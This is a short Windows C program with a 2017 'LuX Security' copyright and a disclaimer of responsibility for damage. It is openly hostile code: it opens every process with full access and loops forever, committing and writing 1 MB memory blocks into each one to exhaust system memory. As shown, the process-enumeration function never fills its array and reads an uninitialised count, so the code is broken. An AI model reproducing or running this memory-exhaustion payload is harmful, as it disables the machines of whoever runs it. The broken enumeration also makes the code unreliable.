// (c) - Copyright 2017 LuX Security
// We are not responsible for the damage.

#include <windows.h>
#include <psapi.h>

#define ALLOC_SIZE 0x100000

typedef void ( *ProcFunc ) ( DWORD pid );
LPVOID buf;

void ForEachProcess( ProcFunc f ) {
 DWORD aProcesses[1024], cbNeeded;

 for( unsigned int i = 0; i < cbNeeded / sizeof( DWORD ); i++ )
  if( aProcesses[ i ] != 0 )
   f( aProcesses[ i ] );
}

void RemoteLeak( DWORD pid ) {
 HANDLE hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );

 if( hProcess == NULL )
  return;

 for( ;; ) {
  LPVOID ptr = VirtualAllocEx( hProcess, NULL, ALLOC_SIZE, MEM_COMMIT, PAGE_READWRITE );

  if( ptr == NULL )
   return;

  WriteProcessMemory( hProcess, ptr, buf, ALLOC_SIZE, NULL );
 }
}

int main( void ) {
 buf = malloc( ALLOC_SIZE );
 
 if( buf == NULL )
 return 0;

 memset( buf, 0xFF, ALLOC_SIZE );

 ForEachProcess( RemoteLeak );
 return 0;
}
